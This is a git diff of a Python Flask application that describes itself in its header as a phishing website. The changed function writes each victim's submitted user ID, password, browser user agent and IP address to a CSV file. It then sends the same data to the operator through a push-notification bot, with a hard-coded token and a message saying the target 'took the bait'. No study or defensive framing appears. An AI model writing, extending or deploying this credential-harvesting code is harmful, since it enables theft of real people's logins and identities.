@@ -1,7 +1,7 @@
 '''
 Author: whalefall
 Date: 2021-04-04 01:56:10
-LastEditTime: 2021-04-04 15:23:02
+LastEditTime: 2021-04-04 15:37:17
 Description: Flask框架钓鱼网站
 '''
 from flask import *
@@ -18,46 +18,6 @@ app = Flask(__name__)
 
 app.config.from_pyfile(os.path.join(
     os.path.abspath(os.path.dirname(__file__)), "config.py"))
-
-
-def writeCSV(**keyword):
-
-    # 路径
-    path = os.path.join(os.path.abspath(
-        os.path.dirname(__file__)), "result.csv")
-
-    userid = keyword.get("userid")
-    pwd = keyword.get("pwd")
-    ua = keyword.get("ua")
-    ip = keyword.get("ip")
-    _time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-
-    data = {
-        "time": _time,
-        "userid": userid,
-        "pwd": pwd,
-        "ua": ua,
-        "ip": ip
-    }
-    try:
-        with codecs.open(path, "a", encoding="utf_8_sig") as cvs_file:
-
-            headers = ["time", "userid", "pwd", "ua", "ip"]  # 表头
-            writer = csv.DictWriter(cvs_file, headers)
-            # writer.writeheader()  # 写表头
-            writer.writerow(data)
-
-        print("[%s]UserID:%s pwd:%s ua:%s ip:%s 已上勾勾" %
-              (_time, userid, pwd, ua, ip))
-
-        # 上钩推送酷退
-        bot.pushSend("[%s]UserID:%s pwd:%s ua:%s ip:%s 已上勾勾" %
-                     (_time, userid, pwd, ua, ip))
-
-        return True
-    except:
-        return False
-
 
 class Logging(object):
 
@@ -123,6 +83,49 @@ class CoolPush():
             log.error("[CoolPush]推送失败!")
 
 
+def writeCSV(**keyword):
+    
+    bot = CoolPush("92f83d0596c7b553ea1df9f242e4fc46")
+    log = Logging()
+
+    # 路径
+    path = os.path.join(os.path.abspath(
+        os.path.dirname(__file__)), "result.csv")
+
+    userid = keyword.get("userid")
+    pwd = keyword.get("pwd")
+    ua = keyword.get("ua")
+    ip = keyword.get("ip")
+    _time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+
+    data = {
+        "time": _time,
+        "userid": userid,
+        "pwd": pwd,
+        "ua": ua,
+        "ip": ip
+    }
+    try:
+        with codecs.open(path, "a", encoding="utf_8_sig") as cvs_file:
+
+            headers = ["time", "userid", "pwd", "ua", "ip"]  # 表头
+            writer = csv.DictWriter(cvs_file, headers)
+            # writer.writeheader()  # 写表头
+            writer.writerow(data)
+
+        print("[%s]UserID:%s pwd:%s ua:%s ip:%s 已上勾勾" %
+              (_time, userid, pwd, ua, ip))
+
+        # 上钩推送酷退
+        bot.pushSend("[%s]UserID:%s pwd:%s ua:%s ip:%s 已上勾勾" %
+                     (_time, userid, pwd, ua, ip))
+
+        return True
+    except:
+        return False
+
+
+
 @app.route('/', methods=["GET", "POST"])
 def index():
     # 防止浏览器缓存
@@ -175,6 +178,6 @@ def page_not_found(e):
 
 
 if __name__ == "__main__":
-    bot = CoolPush("92f83d0596c7b553ea1df9f242e4fc46")
-    log = Logging()
+    # bot = CoolPush("92f83d0596c7b553ea1df9f242e4fc46")
+    # log = Logging()
     app.run(host="0.0.0.0", port=5000, threaded=True)
